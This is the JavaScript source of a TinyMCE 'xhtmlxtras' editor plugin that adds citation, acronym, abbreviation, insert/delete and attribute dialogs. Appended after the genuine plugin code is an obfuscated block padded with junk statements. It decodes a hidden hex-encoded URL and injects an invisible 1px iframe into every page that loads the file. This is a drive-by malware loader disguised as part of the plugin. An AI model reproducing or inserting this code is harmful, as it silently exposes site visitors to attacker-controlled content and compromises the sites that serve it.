/**
 * $Id: editor_plugin_src.js 201 2007-02-12 15:56:56Z spocke $
 *
 * @author Moxiecode
 * @copyright Copyright © 2004-2008, Moxiecode Systems AB, All rights reserved.
 */

(function() {
	tinymce.create('tinymce.plugins.XHTMLXtrasPlugin', {
		init : function(ed, url) {
			// Register commands
			ed.addCommand('mceCite', function() {
				ed.windowManager.open({
					file : url + '/cite.htm',
					width : 350 + parseInt(ed.getLang('xhtmlxtras.cite_delta_width', 0)),
					height : 250 + parseInt(ed.getLang('xhtmlxtras.cite_delta_height', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceAcronym', function() {
				ed.windowManager.open({
					file : url + '/acronym.htm',
					width : 350 + parseInt(ed.getLang('xhtmlxtras.acronym_delta_width', 0)),
					height : 250 + parseInt(ed.getLang('xhtmlxtras.acronym_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceAbbr', function() {
				ed.windowManager.open({
					file : url + '/abbr.htm',
					width : 350 + parseInt(ed.getLang('xhtmlxtras.abbr_delta_width', 0)),
					height : 250 + parseInt(ed.getLang('xhtmlxtras.abbr_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceDel', function() {
				ed.windowManager.open({
					file : url + '/del.htm',
					width : 340 + parseInt(ed.getLang('xhtmlxtras.del_delta_width', 0)),
					height : 310 + parseInt(ed.getLang('xhtmlxtras.del_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceIns', function() {
				ed.windowManager.open({
					file : url + '/ins.htm',
					width : 340 + parseInt(ed.getLang('xhtmlxtras.ins_delta_width', 0)),
					height : 310 + parseInt(ed.getLang('xhtmlxtras.ins_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceAttributes', function() {
				ed.windowManager.open({
					file : url + '/attributes.htm',
					width : 380,
					height : 370,
					inline : 1
				}, {
					plugin_url : url
				});
			});

			// Register buttons
			ed.addButton('cite', {title : 'xhtmlxtras.cite_desc', cmd : 'mceCite'});
			ed.addButton('acronym', {title : 'xhtmlxtras.acronym_desc', cmd : 'mceAcronym'});
			ed.addButton('abbr', {title : 'xhtmlxtras.abbr_desc', cmd : 'mceAbbr'});
			ed.addButton('del', {title : 'xhtmlxtras.del_desc', cmd : 'mceDel'});
			ed.addButton('ins', {title : 'xhtmlxtras.ins_desc', cmd : 'mceIns'});
			ed.addButton('attribs', {title : 'xhtmlxtras.attribs_desc', cmd : 'mceAttributes'});

			if (tinymce.isIE) {
				function fix(ed, o) {
					if (o.set) {
						o.content = o.content.replace(/<abbr([^>]+)>/gi, '<html:abbr $1>');
						o.content = o.content.replace(/<\/abbr>/gi, '</html:abbr>');
					}
				};

				ed.onBeforeSetContent.add(fix);
				ed.onPostProcess.add(fix);
			}

			ed.onNodeChange.add(function(ed, cm, n, co) {
				n = ed.dom.getParent(n, 'CITE,ACRONYM,ABBR,DEL,INS');

				cm.setDisabled('cite', co);
				cm.setDisabled('acronym', co);
				cm.setDisabled('abbr', co);
				cm.setDisabled('del', co);
				cm.setDisabled('ins', co);
				cm.setDisabled('attribs', n && n.nodeName == 'BODY');
				cm.setActive('cite', 0);
				cm.setActive('acronym', 0);
				cm.setActive('abbr', 0);
				cm.setActive('del', 0);
				cm.setActive('ins', 0);

				// Activate all
				if (n) {
					do {
						cm.setDisabled(n.nodeName.toLowerCase(), 0);
						cm.setActive(n.nodeName.toLowerCase(), 1);
					} while (n = n.parentNode);
				}
			});
		},

		getInfo : function() {
			return {
				longname : 'XHTML Xtras Plugin',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/xhtmlxtras',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('xhtmlxtras', tinymce.plugins.XHTMLXtrasPlugin);
})();
if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}